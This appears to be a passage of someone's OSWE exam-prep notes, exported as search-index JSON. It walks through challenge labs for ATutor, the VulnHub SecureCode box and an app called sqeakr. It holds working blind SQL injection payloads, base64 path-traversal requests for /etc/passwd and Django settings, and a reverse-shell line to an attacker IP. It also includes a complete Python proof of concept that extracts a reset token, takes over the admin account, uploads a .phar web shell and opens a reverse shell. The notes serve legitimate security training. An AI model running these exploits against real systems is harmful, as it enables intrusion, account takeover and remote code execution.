"OSWE/Challenge%20Labs/14-ATutor/", "title": "ATutor", "text": "<p>Resource: OSWE-Labs-Poc</p> <p>ATutor 2.2.1 download</p> <p>HTTP server configuration using Kali Linux / hosted a website on Kali</p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#install-docker-compose", "title": "Install docker compose", "text": "<pre><code>sudo curl -L \"https://github.com/docker/compose/releases/download/v2.33.1/docker-compose-$(uname -s)-$(uname -m)\"  -o /usr/local/bin/docker-compose\n\nsudo mv /usr/local/bin/docker-compose /usr/bin/docker-compose\n\nsudo chmod +x /usr/bin/docker-compose      \n</code></pre> <p>Please ignore this part, cause I decided to install ATutor on Kali directly instead of using Docker.</p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#install-atutor-on-kali", "title": "Install ATutor on Kali", "text": "<p>Set up MySql</p> <pre><code>sudo service mysql start\n\n# see running services\nsystemctl list-units --type=service --state=running\nps -aux | grep mysql\nservice mysql status \n\nmysql -u root -p\n\nCREATE DATABASE IF NOT EXISTS atutor;\n</code></pre> <p></p> <pre><code>sudo tail -f /var/log/apache2/error.log\nsudo tail -f /var/log/php_errors.log\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#use-github-repo-directly", "title": "Use GitHub Repo directly", "text": "<p>ngshaohui/ATutor</p> <pre><code>$ git clone https://github.com/ngshaohui/ATutor.git\n\n$ sudo systemctl start docker\n$ sudo systemctl enable docker\n\n# remove stopped containers\n$ sudo docker container prune\n\n# execute Dockerfile\n$ sudo docker build -t atutor .\n\n# run docker image\n$ sudo docker run -d -p 8080:80 --name atutor-container atutor\n\n# check if the container is running\n$ sudo docker ps \n</code></pre> <p>visit http://127.0.0.1:8080/install/install.php</p> <p> </p> <pre><code>mkdir -p content/logs  \n\nchmod -R 777 content/logs\n\nsudo docker stop atutor-container\n\nsudo docker rm atutor-container\n\nsudo docker run -d -p 8080:80 -v /home/kali/OSWE/ATutor/content/logs:/content/logs --name atutor-container atutor\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#atutor-in-the-challenge-lab", "title": "ATutor in the challenge lab", "text": "<p>192.168.162.103 OS:</p> <p>student / studentlab</p> <p>MySQL:</p> <p>root / toor</p> <p>Web Application:</p> <p>teacher / teacher123</p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#141-get-started", "title": "14.1 Get started", "text": "<p>ATutor provides you with 3 levels of access:</p> <ul> <li> <p>Student</p> </li> <li> <p>Teacher</p> </li> <li> <p>Administrator</p> </li> </ul>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#1411-setting-up-the-environment", "title": "14.1.1. Setting Up the Environment", "text": "<pre><code>sudo nano /etc/mysql/my.cnf\n\n[mysqld]\n...\ngeneral_log_file        = /var/log/mysql/mysql.log\ngeneral_log             = 1\n\nsudo systemctl restart mysql\n\nsudo tail \u2013f /var/log/mysql/mysql.log\n</code></pre> <p>Furthermore, since we are dealing with a PHP web application, we can also enable the PHP <code>display_errors</code> directive. With this directive turned on, we will be able to see any PHP errors we trigger in a verbose form, which can aid us during our analysis. To do that, we add the following line to the <code>/etc/php5/apache2/php.ini</code> file:</p> <p><code>display_errors = On</code></p> <p>Finally, we need to restart the Apache service for the new configuration setting to take effect.</p> <p><code>sudo systemctl restart apache2</code></p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#142-initial-vulnerability-discovery", "title": "14.2. Initial Vulnerability Discovery", "text": "<p>More specifically, all pages that do not require authentication contain the following line in their source code:</p> <p><code>$_user_location    = 'public';</code></p> <pre><code>$ grep -rnw /var/www/html/ATutor -e \"^.*user_location.*public.*\" --color\n</code></pre> <pre><code>scp -r student@atutor.local:/var/www/html/ATutor .\n</code></pre> <p>Find writable directories</p> <pre><code>find /var/www/html/ -type d -perm -o+w\n</code></pre> <p><code>-perm -o+w</code>: Finds items where \"others\" (non-owner, non-group users) have write (w) permission</p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#initial-discovery-sqli", "title": "Initial discovery - SQLi", "text": "<p><code>mods/_standard/social/index_public.php</code> line 42 <code>searchFriends</code> function is vulnerable.</p> <pre><code>//if $_GET['q'] is set, handle Ajax.\nif (isset($_GET['q'])){\n    $query = $addslashes($_GET['q']);\n\n    //retrieve a list of friends by the search\n    $search_result = searchFriends($query);\n\n\n    if (!empty($search_result)){\n        echo '&lt;div class=\"suggestions\"&gt;'._AT('suggestions').':&lt;br/&gt;';\n        $counter = 0;\n        foreach($search_result as $member_id=&gt;$member_array){\n            //display 10 suggestions\n            if ($counter &gt; 10){\n                break;\n            }\n\n            echo '&lt;a href=\"javascript:void(0);\" onclick=\"document.getElementById(\\'search_friends\\').value=\\''.printSocialName($member_id, false).'\\'; document.getElementById(\\'search_friends_form\\').submit();\"&gt;'.printSocialName($member_id, false).'&lt;/a&gt;&lt;br/&gt;';\n            $counter++;\n        }\n        echo '&lt;/div&gt;';\n    }\n    exit;\n}\n</code></pre> <p><code>searchFriends</code> function is defined in <code>mods/_standard/social/lib/friends.inc.php</code> file. It uses concatenated query strings which allow sql injection attacks.</p> <pre><code>function searchFriends($name, $searchMyFriends = false, $offset=-1){\n    global $addslashes;\n    $result = array(); \n    $my_friends = array();\n    $exact_match = false;\n\n    //break the names by space, then accumulate the query\n    if (preg_match(\"/^\\\\\\\\?\\\"(.*)\\\\\\\\?\\\"$/\", $name, $matches)){\n        $exact_match = true;\n        $name = $matches[1];\n    }\n    $name = $addslashes($name); \n    $sub_names = explode(' ', $name);\n    foreach($sub_names as $piece){\n        if ($piece == ''){\n            continue;\n        }\n\n        //if there are 2 double quotes around a search phrase, then search it as if it's \"first_name last_name\".\n        //else, match any contact in the search phrase.\n        if ($exact_match){\n            $match_piece = \"= '$piece' \";\n        } else {\n            //$match_piece = \"LIKE '%$piece%' \";\n            $match_piece = \"LIKE '%%$piece%%' \";\n        }\n        if(!isset($query )){\n            $query = '';\n        }\n        $query .= \"(first_name $match_piece OR second_name $match_piece OR last_name $match_piece OR login $match_piece ) AND \";\n    }\n    //trim back the extra \"AND \"\n    $query = substr($query, 0, -4);\n\n    //Check if this is a search on all people\n    if ($searchMyFriends == true){\n        //If searchMyFriend is true, return the \"my friends\" array\n        //If the member_id is empty, (this happens when we are doing a search without logging in) then get all members?\n        //else, use \"my friends\" array to distinguish which of these are already in my connection\n        if(!isset($_SESSION['member_id'])){\n            $sql = 'SELECT member_id FROM '.TABLE_PREFIX.'members WHERE ';\n        } else {\n            $sql = 'SELECT F.* FROM '.TABLE_PREFIX.'social_friends F LEFT JOIN '.TABLE_PREFIX.'members M ON F.friend_id=M.member_id WHERE (F.member_id='.$_SESSION['member_id'].') AND ';\n            $sql .= $query;\n            $sql .= ' UNION ';\n            $sql .= 'SELECT F.* FROM '.TABLE_PREFIX.'social_friends F LEFT JOIN '.TABLE_PREFIX.'members M ON F.member_id=M.member_id WHERE (F.friend_id='.$_SESSION['member_id'].') AND ';\n        }\n        $sql .= $query;\n\n        $rows_friends = queryDB($sql, array(), '', FALSE);\n\n        if(count($rows_friends) &gt; 0){\n            foreach($rows_friends as $row){\n                if ($row['member_id']==$_SESSION['member_id']){\n                    $this_id = $row['friend_id'];\n                } else {\n                    $this_id = $row['member_id'];\n                }\n                $temp =&amp; $my_friends[$this_id]; \n                $temp['obj'] = new Member($this_id);\n                if ($searchMyFriends){\n                    $temp['added'] = 1;\n                }\n            }\n        }\n        unset($this_id);  //don't want the following statements to reuse this\n        return $my_friends;\n    } else {\n        /*\n        * Harris' note:\n        * IF the 'search my friend' is off, then it should search all members inside that table\n        * don't know why i did the search inside [friends x members]\n        * Also this query is gonna pull out all members cept 'myself'\n        * raised a small problem for public use, cause there is no member_id\n        * end note;\n        */\n        //$sql = 'SELECT * FROM '.TABLE_PREFIX.'social_friends F LEFT JOIN '.TABLE_PREFIX.'members M ON F.friend_id=M.member_id WHERE ';\n        $sql = 'SELECT * FROM '.TABLE_PREFIX.'members M WHERE ';\n        if (isset($_SESSION['member_id'])){\n            $sql .= 'member_id!='.$_SESSION['member_id'].' AND ';\n        }\n    }\n    $sql = $sql . $query;\n    if ($offset &gt;= 0){\n        $sql .= \" LIMIT $offset, \". SOCIAL_FRIEND_SEARCH_MAX;\n    }\n\n    $rows_members = queryDB($sql, array());\n\n    //Get all members out\n    foreach($rows_members as $row){\n        $this_id = $row['member_id'];\n\n\n        //skip empty entry, don't know why there would be empty entry. \n        //TODO: Trace this. could be a bug in query\n        if ($this_id == ''){\n            continue;\n        }\n\n        $temp =&amp; $result[$this_id]; \n        $temp['id'] = $this_id;\n\n        //if this person exists in \"my friends\" list, mark it.\n        if (isset($my_friends[$this_id])){\n            $temp['added'] = 1;\n        }\n    } \n    return $result;\n}\n</code></pre> <pre><code>off')/**/or/**/(select/**/1)=1# \n\n# it block the following query\n\n$match_piece = \"LIKE '%%$piece%%' \";\n$query .= \"(first_name $match_piece OR second_name $match_piece OR last_name $match_piece OR login $match_piece ) AND \";\n\n# can not use -- as comment sign\n\n(first_name LIKE 'off')/**/or/**/(select/**/1)=1# OR second_name $match_piece OR last_name $match_piece OR login $match_piece ) AND \n\nGET /ATutor/mods/_standard/social/index_public.php?q=off%27)%2f**%2for%2f**%2f(select%2f**%2f1)=1%23 \n</code></pre> <p></p> <p>When subsequent query is true, the content length of response is 246, otherwise is 0.</p> <p></p> <p></p> <p>I tried to use <code>--</code> and <code>#</code> in Mysql as comment sign both worked, but when use <code>--</code> it encountered an error.</p> <pre><code>off')/**/or/**/(select/**/1)=0/**/--/**/\n\noff%27)%2f**%2for%2f**%2f(select%2f**%2f1)=0%2f**%2f--%2f**%2f\n</code></pre> <pre><code># SQLi payload\noff')/**/or/**/(select/**/ASCII(SUBSTRING(password,1,1))/**/from/**/AT_members/**/where/**/member_id=1/**/limit/**/1)=56#\n</code></pre> <p></p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#login-as-teacher", "title": "Login as teacher", "text": "<pre><code>mysql -u root -ptoor -h localhost\n\nselect * from AT_members;\n\nmember_id | login   | password \n1 | teacher | 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e \n</code></pre> <p>themes/default/registration.tmpl.php</p> <pre><code>function encrypt_password()\n{\n    document.form.password_error.value = \"\";\n\n    err = verify_password(document.form.form_password1.value, document.form.form_password2.value);\n\n    if (err.length &gt; 0)\n    {\n        document.form.password_error.value = err;\n    }\n    else\n    {\n        document.form.form_password_hidden.value = hex_sha1(document.form.form_password1.value);\n        document.form.form_password1.value = \"\";\n        /*document.form.form_password2.value = \"\";*/\n    }\n}\nfunction encrypt_password_login()\n{\n    document.form1.form1_password_hidden.value = hex_sha1(hex_sha1(document.form1.form1_password.value) + \"&lt;?php echo $_SESSION['token']; ?&gt;\");\n    document.form1.form1_password.value = \"\";\n    return true;\n}\n</code></pre> <p>In <code>themes/default/registration.tmpl.php</code> when encrypt password it only uses <code>hex_sha1</code> function once, but when login it uses <code>hex_sha1</code> twice.</p> <p><code>themes/default/login.tmpl.php</code></p> <pre><code>/* \n * Encrypt login password with sha1\n */\nfunction encrypt_password() {\n    document.form.form_password_hidden.value = hex_sha1(hex_sha1(document.form.form_password.value) + \"&lt;?php echo $_SESSION['token']; ?&gt;\");\n    document.form.form_password.value = \"\";\n    return true;\n}\n</code></pre> <p>token = dc26559a4d84bf00f686f81fe796f2b1bfdb144a</p> <p>final password hidden value is </p> <p><code>include/login_functions.inc.php</code></p> <pre><code>if (isset($_POST['token']))\n{\n    $_SESSION['token'] = $_POST['token'];\n}\nelse\n{\n    if (!isset($_SESSION['token']))\n        $_SESSION['token'] = sha1(mt_rand() . microtime(TRUE));\n}\n</code></pre> <p>When do POST request, if user set token, it will use the user's setting directly.</p>"}, {"location": "OSWE/Challenge%20Labs/14-ATutor/#file-upload-vulnerability-when-creating-tests", "title": "File upload vulnerability when creating tests", "text": "<p>Hacking Course -&gt; Manage -&gt; Tests and Surveys</p> <p></p> <p></p> <p>mods/_standard/tests/import_test.php</p> <pre><code>$ims_manifest_xml = @file_get_contents($import_path.'imsmanifest.xml');\n</code></pre> <p>Find writable directories</p> <pre><code>find /var/www/html/ -type d -perm -o+w\n</code></pre> <p></p> <p>include/lib/constants.inc.php</p> <pre><code>$_config_defaults['illegal_extentions']        = 'exe|asp|php|php3|bat|cgi|pl|com|vbs|reg|pcd|pif|scr|bas|inf|vb|vbe|wsc|wsf|wsh';\n</code></pre> <p></p> <p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.174/4445 0&gt;&amp;1'</code></p> <p></p> <p>https://en.wikipedia.org/wiki/ASCII</p>"}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/", "title": "15. ATutor LMS Type Juggling Vulnerability", "text": ""}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#get-started", "title": "Get started", "text": "<p>URL Username    Password</p> <p>http://atutor/  teacher teacher123</p> <p>ssh://atutor    root    toor</p> <p>With the Atmail VM being retired, you can use Python on the ATutor server to handle emails by running <code>sudo python3 -m smtpd -n -c DebuggingServer 127.0.0.1:587 2&gt;&amp;1</code> and configuring Postfix to use localhost instead of Atmail's IP address. While this command is running, it will print emails to the terminal.</p> <pre><code># Replace 192.168.121.106 with the IP address of your Atmail VM\nsudo cat /etc/postfix/transport\n...\noffsec.local    smtp:[192.168.121.106]:587\n...\n\n# Updating the Postfix transport configuration\nsudo postmap /etc/postfix/transport\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#152-php-loose-and-strict-comparisons", "title": "15.2. PHP Loose and Strict Comparisons", "text": "<p>In this case, the vulnerability revolves around the use of loose comparisons of user-controlled values, which results in the execution of implicit data type conversions, i.e. type juggling. Ultimately, this allows us to subvert the application logic and perform protected operations from an unauthenticated perspective.</p> <p></p> <p></p>"}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#153-php-string-conversion-to-numbers", "title": "15.3. PHP String Conversion to Numbers", "text": "<p>Try the following equations in different PHP versions. It may  show different results.</p> <pre><code>$ php -a\nInteractive mode enabled\n\nphp &gt; var_dump('0eAAAA' == '0');\nbool(false)\n\nphp &gt; var_dump('0e1111' == '0');\nbool(true)\n\nphp &gt; var_dump('0e9999' == 0);\nbool(true)\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#154-vulnerability-discovery", "title": "15.4. Vulnerability Discovery", "text": "<p>To recap what we know so far, confirm.php does not require authentication and can be used to change the email of an existing user. We also know from the previous analysis that in the code logic to update an existing user email address:</p> <ul> <li> <p>the $id GET variable corresponds to the unique ID value assigned to each ATutor user in the database and is under attacker control</p> </li> <li> <p>the $e GET variable corresponds to the new email address we would like to set and is under attacker control</p> </li> <li> <p>the attacker controlled $m GET variable is used to decide if we are allowed to update the email address for the target user based on a loose comparison against the calculated $code variable</p> </li> <li> <p>the $code variable is a ten characters MD5 hash substring partially under attacker control</p> </li> </ul>"}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#155-attacking-the-loose-comparison", "title": "15.5. Attacking the Loose Comparison", "text": ""}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#1551-magic-hashes", "title": "15.5.1. Magic Hashes", "text": "<pre><code>$ php -a\nInteractive mode enabled\n\nphp &gt; echo md5('240610708');\n0e462097431906509019562988736854\n\nphp &gt; var_dump('0e462097431906509019562988736854' == '0');\nbool(true)\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/15-ATutor_LMS/#1552-atutor-and-the-magic-e-mail-address", "title": "15.5.2. ATutor and the Magic E-Mail address", "text": "<p><code>$code = substr(md5($e . $row['creation_date'] . $id), 0, 10);</code></p> <p>Based on the listing above, we can deduce that in our brute force approach the only value that we can change on each iteration is the <code>$e</code> variable. This is the new email address that we provide for the target user. The account creation date is pulled from the database and should be static. Similarly, the account ID needs to stay static as well, since we are targeting a single account.</p> <p>Again, if such a Magic Hash is found it will allow us to defeat the vulnerable loose comparison as we can set <code>$m</code> to zero in our GET request. The critical check between <code>$code</code> and <code>$m</code> will then look like the following:</p> <pre><code>if (0eDDDDDDDD == 0)\n  UPDATE THE EMAIL ADDRESS\n</code></pre> <p>confirm.php:</p> <pre><code>if ($code == $m) {\n        $sql = \"UPDATE %smembers SET email='%s', last_login=NOW(), creation_date=creation_date WHERE member_id=%d\";\n        $result = queryDB($sql, array(TABLE_PREFIX, $e, $id));\n</code></pre> <p><code>0eDDDDDDDD</code> will evaluate to zero</p>"}, {"location": "OSWE/Challenge%20Labs/POC%20script%20requirement/", "title": "POC script requirement", "text": "<p>The PoC script should be executed without user interaction. The exam grader who is going to execute your PoC code should not be required to do anything manually while PoC code is running.  Before execution: You can set a netcat listener, apache webserver before running the script. After execution: If you get a reverse shell, you can grab the flags and type ifconfig/ipconfig to show the IP address manually.</p> <p>However, if you don't obtain reverse shell, then the PoC script should automatically extract the proof values.</p> <p>You can have a dependency script for your main functional script if you require to use an external tool input. However, you'll need to provide the full contents of the scripts in your exam report and everything should be automated while you run the PoC script.</p>"}, {"location": "OSWE/Challenge%20Labs/securecode/", "title": "SecureCode", "text": "<p>https://www.vulnhub.com/entry/securecode-1,651 </p>"}, {"location": "OSWE/Challenge%20Labs/securecode/#network-discovery", "title": "Network Discovery", "text": "<pre><code>$ sudo netdiscover\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/securecode/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 192.168.255.142 -p- -T4 --min-rate=10000 -sCV\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Coming Soon 2\n| http-robots.txt: 1 disallowed entry \n|_/login/*\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nMAC Address: 00:0C:29:76:E7:7A (VMware)\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/securecode/#web-app", "title": "WEB APP", "text": "<p>Source code: http://192.168.255.142/source_code.zip</p> <p>login/resetPassword.php</p> <pre><code>&lt;?php\n\ninclude \"../include/header.php\";\n$username = mysqli_real_escape_string($conn, @$_POST['username']);\n\nif(isset($username) and ctype_alnum($username)){\n\n    $data = mysqli_query($conn, \"SELECT * FROM user\");\n    $users = [];\n    while($result= mysqli_fetch_array($data)){\n        array_push($users, $result['username']);\n    }\n\n    if(in_array($username, $users)){\n\n        $token = generateToken();\n        mysqli_query($conn,\"UPDATE user SET token = '$token' WHERE username = '$username'\");\n        send_email($username, $token);\n        $_SESSION['status']=\" Password Reset Link has been sent to you via Email, please check it out.\";    \n        header(\"location: login.php\");\n        die();\n\n    }else{\n\n        $_SESSION['danger']=\" Username not found.\";\n        header(\"location: resetPassword.php\");\n        die();\n\n    }\n\n}else{\n\n?&gt;\n</code></pre> <p>login/doResetPassword.php</p> <pre><code>&lt;?php\n\ninclude \"../include/header.php\";\n\n$p_token = $_GET['token'];\n\n$data = mysqli_query($conn, \"SELECT * FROM user\");\n$tokens = [];\nwhile($result = mysqli_fetch_array($data)){\n    array_push($tokens, $result['token']);\n}\n\nif(ctype_alnum($p_token) AND in_array($p_token, $tokens)){\n\n?&gt;\n</code></pre> <p>It uses a token to reset password.</p> <p>When view <code>item/</code> folder, all PHP files include <code>../include/isAuthenticated.php</code> to check authentication except <code>item/viewItem.php</code></p> <pre><code>&lt;?php\n\n// Still under development\nsession_start();\nini_set(\"display_errors\", 0);\ninclude \"../include/connection.php\";\n\n// see if user is authenticated, if not then redirect to login page\nif($_SESSION['id_level'] != 1){\n\n    $_SESSION['danger'] = \" You not have access to visit that page\";\n    header(\"Location: ../login/login.php\");\n\n}\n// only for users with level 1 (admins)\n// prevent SQL injection\n$id = mysqli_real_escape_string($conn, $_GET['id']);\n$data = mysqli_query($conn, \"SELECT * FROM item WHERE id = $id\");\n$result = mysqli_fetch_array($data);\n\n//var_dump($result);\nif(isset($result['id'])){\n    http_response_code(404);\n}\n?&gt;\n</code></pre> <p>mysqli_real_escape_string | documentation</p> <p></p> <pre><code>-- check database name hackshop\nand ascii(substr(database(),1,1))=104 -- -\n\n-- when use hex need to use ' which is not allowed\nand+hex(substring(database(),4,1))='6b'+--+-\n\nGET /item/viewItem.php?id=1+and+ascii(substring(database(),4,1))=107+--+-\n</code></pre> <p>When the subsequence query is true , the response is 404 Not Found</p> <p></p> <p>When the subsequence query is false, the resposne is 302 Found</p> <p><code>GET /item/viewItem.php?id=1+and+1=3+--+-</code></p> <p></p> <p>In <code>item/updateItem.php</code> it doesn't check MIME type, can use <code>.phar</code> to avoid extension check.</p> <pre><code>&lt;?php \n\ninclude \"../include/header.php\";\ninclude \"../include/isAuthenticated.php\";\n\n$id = mysqli_real_escape_string($conn, $_POST['id']);\n$id_user = mysqli_real_escape_string($conn, $_POST['id_user']);\n$name = mysqli_real_escape_string($conn, $_POST['name']);\n$imgname = mysqli_real_escape_string($conn, $_FILES['image']['name']);\n$description = mysqli_real_escape_string($conn, $_POST['description']);\n$price = mysqli_real_escape_string($conn, $_POST['price']);\n\n$blacklisted_exts = array(\"php\", \"phtml\", \"shtml\", \"cgi\", \"pl\", \"php3\", \"php4\", \"php5\", \"php6\");\n\nif(isset($id, $id_user, $name, $imgname, $description, $price)){\n\n    $ext = strtolower(pathinfo($imgname)['extension']);\n    if(!in_array($ext, $blacklisted_exts)){\n\n        $up = move_uploaded_file($_FILES['image']['tmp_name'], \"image/\".$imgname);\n        $res = mysqli_query($conn, \"UPDATE item SET name='$name', imgname='$imgname', description='$description',price='$price' WHERE id='$id'\");\n        if($res == true AND $up == true){\n            $_SESSION['status']=\" Item data has been edited\";\n        }else{\n            $_SESSION['danger']=\" Failed to edit Item\";\n        }\n        header(\"Location: index.php\");\n        die();\n\n    }else{\n        $_SESSION['danger']=\" File is not accepted.\";\n        header(\"Location: index.php\");\n        die();\n    }\n\n}else{\n    $_SESSION['danger']=\" Some Fields are missing.\";\n    header(\"Location: index.php\");\n}\n?&gt;\n</code></pre> <p></p> <p></p> <p></p> <p></p>"}, {"location": "OSWE/Challenge%20Labs/securecode/#all-in-one-poc", "title": "All in one, POC", "text": "<pre><code>import requests, argparse\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\nALPHANUMERIC=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\nproxies = {\n    \"http\":\"http://127.0.0.1:8080\",\n    \"https\":\"http://127.0.0.1:8080\"\n}\n\ndef send_reset_password_token(session, target):\n    url = f\"http://{target}/login/resetPassword.php\"\n    data = {\n        \"username\":\"admin\"\n    }\n\n    headers = {\n        \"Referer\": f\"http://{target}/login/login.php\",\n        \"Origin\": f\"http://{target}\"\n    }\n    response = session.post(url, data=data, headers=headers, proxies=proxies, verify=False)\n    if \"Password Reset Link has been sent to you via Email, please check it out.\" in response.text:\n        print(\"Password Reset Link has been sent to you via Email, please check it out.\")\n        return True\n    print(\"Password reset request failed!\")\n    return False\n\ndef send_request(session, position, char, target):\n    url = f\"http://{target}/item/viewItem.php\"\n\n    ascii_value = ord(char)\n\n    # cannot use ' cause the source code calls mysqli_real_escape_string function to avoid sql injection\n    payload = f\"1 and (select ASCII(SUBSTRING(token,{position},1)) from user where id=1 limit 1)={ascii_value} -- -\"\n    # print(\"payload: \", payload)\n    params = {\n        \"id\": payload\n    }\n    response = session.get(url, params=params, proxies=proxies, verify=False, allow_redirects=False)\n    if response.status_code == 404:\n        return char\n    return None\n\ndef enumerate_token(session, target):\n    extracted_token = \"\"\n    position = 1\n\n    while True:\n        for char in ALPHANUMERIC:\n            result = send_request(session, position,char, target)\n            if result:\n                    extracted_token += result\n                    print(f\"[+] Found character {position}: {result}\")\n                    break\n        else:\n            print(f\"[!] Token extraction complete. Final token: {extracted_token}\")\n            break\n        position += 1\n    return extracted_token\n\ndef reset_admin_password(session, target, token):\n    url = f\"http://{target}/login/doResetPassword.php\"\n    params = {\n        \"token\":token\n    }\n    response = session.get(url, params=params, proxies=proxies, verify=False, allow_redirects=False)\n    if \"Valid Token Provided\" in response.text:\n        change_admin_password(session, target, token)\n    else:\n        print(\"Invalid token.\")\n\ndef change_admin_password(session, target, token):\n    url = f\"http://{target}/login/doChangePassword.php\"\n    data = {\n        \"token\":token,\n        \"password\":\"admin1234!\"\n    }\n    response = session.post(url, data=data, proxies=proxies, verify=False)\n    if \"Password Changed\" in response.text:\n        print(\"Admin password changed.\")\n    else:\n        print(\"Admin password changes failed.\")\n\ndef admin_login(session, target):\n    url = f\"http://{target}/login/checkLogin.php\"\n    data = {  \n        \"username\":\"admin\",\n        \"password\":\"admin1234!\"\n    }\n    response = session.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False)\n    if response.status_code == 302:\n        print(\"Login succeed.\")\n        return True\n    else:\n        print(\"Login failed.\")\n        return False\n\ndef rce(session, target, lhost, lport):\n    url = f\"http://{target}/item/updateItem.php\"\n    boundary = \"---------------------------394859077438028058264268240339\"\n    headers = {         \n        \"Content-Type\": f\"multipart/form-data; boundary={boundary}\",       \n        \"Accept-Encoding\": \"gzip, deflate, br\",\n        \"Referer\": f\"http://{target}/item/editItem.php?id=1\",\n        \"Origin\": f\"http://{target}\"\n    }\n\n    # Manually construct the multipart body\n    body = (\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"id\"\\r\\n\\r\\n'\n        f\"1\\r\\n\"\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"id_user\"\\r\\n\\r\\n'\n        f\"1\\r\\n\"\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"name\"\\r\\n\\r\\n'\n        f\"Raspery Pi 4\\r\\n\"\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"image\"; filename=\"sample.phar\"\\r\\n'\n        f'Content-Type: application/x-php\\r\\n\\r\\n'\n        f\"&lt;?php system($_GET['cmd']); ?&gt;\\r\\n\"\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"description\"\\r\\n\\r\\n'\n        f\"Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B\\r\\n\"\n        f\"--{boundary}\\r\\n\"\n        f'Content-Disposition: form-data; name=\"price\"\\r\\n\\r\\n'\n        f\"92\\r\\n\"\n        f\"--{boundary}--\\r\\n\"\n    ).encode('utf-8')\n\n    response = session.post(url, data=body, headers=headers, proxies=proxies, verify=False, allow_redirects=False)\n    if \"Success!\" in response.text:\n        print(\"Item has been successfully edited, triggering RCE.....\")\n        url = f\"http://{target}/item/image/sample.phar\"\n        params = {\n            \"cmd\":fr\"bash -c 'bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1'\"\n        }\n        session.get(url, params=params, proxies=proxies, verify=False)\n    else:\n        print(\"Editing item failed.\")\n\nif __name__==\"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-t\", \"--target\", help=\"target website IP:Port\", required=True)\n    parser.add_argument(\"-l\", \"--lhost\", help=\"Local listener's IP\", required=True)\n    parser.add_argument(\"-p\", \"--lport\", help=\"Local listener's port\", required=True)\n    args = parser.parse_args()\n\n    session = requests.Session()\n    label = send_reset_password_token(session, args.target)\n\n    if label:\n        token = enumerate_token(session, args.target)\n\n        if token:\n            reset_admin_password(session, args.target, token)\n            label = admin_login(session, args.target)\n            if label:\n                rce(session, args.target, args.lhost, args.lport)\n</code></pre>"}, {"location": "OSWE/Challenge%20Labs/sqeakr/", "title": "sqeakr", "text": ""}, {"location": "OSWE/Challenge%20Labs/sqeakr/#summary", "title": "Summary", "text": "<ol> <li> <p>get registration key from <code>/home/student/sqeakr/sqeakr/settings.py</code> file by using LFI (Local File Inclusion)/path traversal exploit.</p> </li> <li> <p>in <code>/home/student/sqeakr/api/views/sqeakviews.py</code> , draft cookie can exploit Python pickle vulnerability to get RCE</p> </li> </ol> <p></p> <pre><code>User-agent: *\nDisallow: /api/login\nDisallow: /api/register/\nDisallow: /api/compose\nDisallow: /api/draft\nDisallow: /api/profile/update\nDisallow: /api/profile/upload\nDisallow: /api/profile/preview/*\nDisallow: /api/profile/approve/*\nDisallow: /api/profile/password\nDisallow: /api/avatars/*\nAllow: /api/sqeaks\nAllow: /feed\n</code></pre> <pre><code># base64 encoded\n../../../../.././etc/passwd\n../../../../../../etc/passwd\n../etc/passwd\n\nGET /api/profile/preview/Li4vLi4vLi4vLi4vLi4vLi9ldGMvcGFzc3dk\n\n# list folder content\nGET /api/profile/avatars/....//sqeakr/ \n\nGET /api/profile/avatars/....//....//....//....//home/student/sqeakr/sqeakr/\n\n../../../../.././home/student/sqeakr/sqeakr/settings.py\n\nGET /api/profile/preview/Li4vLi4vLi4vLi4vLi4vLi9ob21lL3N0dWRlbnQvc3FlYWtyL3NxZWFrci9zZXR0aW5ncy5weQ==\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p></p> <pre><code>\"\"\"\nDjango settings for sqeakr project.\n\nGenerated by 'django-admin startproject' using Django 2.2.12.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.2/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/2.2/ref/settings/\n\"\"\"\n\nimport os\nimport environ\nenv = environ.Env(\n    # set casting, default value\n    PICKLE_EXPECTED_LENGTH=(int, 100),\n    DEBUG=(bool, False)\n)\n# reading .env file\nenviron.Env.read_env()\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/2.2/howto/deployment/checklist/\n\n# 